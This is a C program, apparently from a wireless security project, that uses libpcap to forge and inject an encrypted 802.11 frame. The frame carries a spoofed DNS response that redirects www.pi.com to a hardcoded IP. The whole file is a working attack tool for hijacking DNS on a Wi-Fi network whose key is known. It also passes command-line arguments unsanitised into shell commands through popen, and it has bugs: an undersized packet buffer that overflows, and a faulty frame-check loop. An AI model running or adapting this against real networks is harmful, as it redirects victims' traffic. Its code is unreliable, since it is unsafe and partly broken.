#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <pcap.h>

int main(int argc, char **argv) // Usage: ./sender interface senderMAC destMAC senderIP destIP senderPort destPort transactionId encryptionKey
{
    if(argc < 10)
    {
    	printf("Usage: ./packetSender interface senderMAC destMAC senderIP destIP senderPort destPort transactionId encryptionKey");
    	return 0;
    }

    pcap_t *pcapObject;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[100];
    int i;
    
    
    // open the output device
    pcapObject = pcap_open_live(argv[1], 100, 1, 1000, errbuf);
    
    // if there was a problem during opening the output device
    if (pcapObject == NULL)
    {
        printf("Unable to open the adapter. %s", argv[1]);
        return 0;
    }

    
    // here we define alot of the values that will be used later in the program for crafting the packet,
    // some of the values are pulled from the command line and some are hard programmed in

    char* senderAddress = argv[2];
    char* destinationAddress = argv[3];
    
    char* sourceIP = argv[4];
    char* destinationIP = argv[5];
    
    char* udpSourcePort = argv[6];
    char* udpDestinationPort = argv[7];
    
    char* transactionId = argv[8];
    char* key = argv[9];
    
    char* nonce = "1A";
    char* udpLength = "0034";
    char udpChecksum[5] = "0000";
    char* macTimestamp = "1E914E3E00000000";
    
    
    
    
    // starting to build up the packet now:
    
    // build DNS responce 
    
    char* redirectIp = "5669f545";
    char dnsPacket[2000] = "";

    snprintf(dnsPacket, sizeof(dnsPacket), "%s818000010001000000000377777702706903636f6d0000010001c00c000100010000003c0004%s", transactionId, redirectIp); 

    
    // calculate udp checksum
    
    FILE *datastream;
    char buffer[2000];
    char commandString[5000];

    snprintf(commandString, sizeof(commandString), "python checksumCalculator.py %s%s0011%s%s%s%s%s", sourceIP, destinationIP, udpSourcePort, udpDestinationPort, udpLength, udpLength, dnsPacket); 
    
    datastream = popen(commandString, "r");
  
    if (datastream == NULL) {
      printf("Failed to run capture\n");
      exit(1);
    }
    
    
    // store the calculated checksum
    fgets(buffer, sizeof(buffer), datastream);
    udpChecksum[0] = buffer[0];
    udpChecksum[1] = buffer[1];
    udpChecksum[2] = buffer[2];
    udpChecksum[3] = buffer[3];
    
    
    
    
    // build UDP layer 
    
    char udpPacket[2000] = "";
    snprintf(udpPacket, sizeof(udpPacket), "%s%s%s%s", udpSourcePort, udpDestinationPort, udpLength, udpChecksum); 


    // build IP layer
    
    char ipPacket[2000] = "";
    char ipChecksum[5] = "0000"; 
    
    // calculate udp ip
    char buffer2[2000];
    char commandString2[5000];
  
    snprintf(commandString2, sizeof(commandString2), "python checksumCalculator.py 4500004843a340004011%s%s", sourceIP, destinationIP);
  
    datastream = popen(commandString2, "r");
  
    if (datastream == NULL) {
      printf("Failed to run capture\n");
      exit(1);
    }
    
    // store the checksum
    fgets(buffer2, sizeof(buffer2), datastream);
    ipChecksum[0] = buffer2[0];
    ipChecksum[1] = buffer2[1];
    ipChecksum[2] = buffer2[2];
    ipChecksum[3] = buffer2[3];
    
    // store the full packet up to the IP layer
    snprintf(ipPacket, sizeof(ipPacket), "4500004843a340004011%s%s%s", ipChecksum, sourceIP, destinationIP); 
    
    
    // Logical link layer
    
    char* logicalLink = "aaaa030000000800";


    // build up encrypted part
    
    char unencryptedPacket[2000];
    
    snprintf(unencryptedPacket, sizeof(unencryptedPacket), "%s%s%s%s", logicalLink, ipPacket, udpPacket, dnsPacket); 
   
    
    char commandString3[5000];
    char buffer5[2000];
  
    snprintf(commandString3, sizeof(commandString3), "python aesDecrypter.py %s %s %s %s", key, senderAddress, nonce, unencryptedPacket);
  
    datastream = popen(commandString3, "r");
    
  
    if (datastream == NULL) {
      printf("Failed to run capture\n");
      exit(1);
    }
    
    // store the encrypted packet
    char encryptedPacket[2000];
    
    fgets(buffer5, sizeof(buffer5), datastream);
    
    snprintf(encryptedPacket, sizeof(encryptedPacket), "%s", buffer5);
    
    
    // build the unecnrypted layers
    
    char ieeePacket[2000] = "";
    
    snprintf(ieeePacket, sizeof(ieeePacket), "88423000%s%s%s400100001a00002000000000", destinationAddress, senderAddress, senderAddress);
    
    
    char currentFullPacket[2000] = "";
    snprintf(currentFullPacket, sizeof(currentFullPacket), "%s%s", ieeePacket, encryptedPacket);
    
    
    
    
    char radiotapHeader[2000] = "";
    
    snprintf(radiotapHeader, sizeof(radiotapHeader), "000027002b4008a02008000000000000%s10009e098004ef000000070407ef00", macTimestamp);
    
    
    
    // calculate frame check sequence
    char frameCheckSequence[9];   
    char buffer4[2000];
    char commandString4[7000];
 
    snprintf(commandString4, sizeof(commandString4), "python frameCheckSequenceCalculator.py %s", currentFullPacket);
    datastream = popen(commandString4, "r");
  
    if (datastream == NULL) {
      printf("Failed to run capture\n");
      exit(1);
    }
    
    // store frame check sequence
    fgets(buffer4, sizeof(buffer4), datastream);
    frameCheckSequence[0] = buffer4[0];
    frameCheckSequence[1] = buffer4[1];
    frameCheckSequence[2] = buffer4[2];
    frameCheckSequence[3] = buffer4[3];
    frameCheckSequence[4] = buffer4[4];
    frameCheckSequence[5] = buffer4[5];
    frameCheckSequence[6] = buffer4[6];
    frameCheckSequence[7] = buffer4[7];
    
    
    // build full packet
    char fullPacket[5000];
    snprintf(fullPacket, sizeof(fullPacket), "%s%s", radiotapHeader, currentFullPacket);
     
    // foreach byte in full packet
    int packetCounter = 0;
    for(int i = 0; i < 306; i++)
    {
    	if(fullPacket[i] != '\0') // if not the end
    	{
    	    char substring[3];
    	    snprintf(substring, sizeof(substring), "%c%c", fullPacket[i], fullPacket[i+1]); // get 2 bytes of the packet
    	    packet[packetCounter] = (int)strtol(substring, NULL, 16); // convert to int and then add the byte to the final byte stream
	}
	i = i + 1;
	packetCounter = packetCounter + 1;
    }
    
    // add the frame check sequence to the final byte stream, this must be sent in pairs of byte in a reverse order
    for(int j = 7; j >= 0; i--)
    {
    	char substring[3];
    	snprintf(substring, sizeof(substring), "%c%c", frameCheckSequence[j-1], frameCheckSequence[j]);
    	
        packet[packetCounter] = (int)strtol(substring, NULL, 16);
    	
	j = j - 2;
	packetCounter = packetCounter + 1;
    }


    /* Send out the packet */
    if (pcap_sendpacket(pcapObject, packet, 161) != 0)
    {
        printf("Error sending the packet");
        return 0;
    }
    
    printf("Spoofed DNS response sent\n");

    return 0;
}
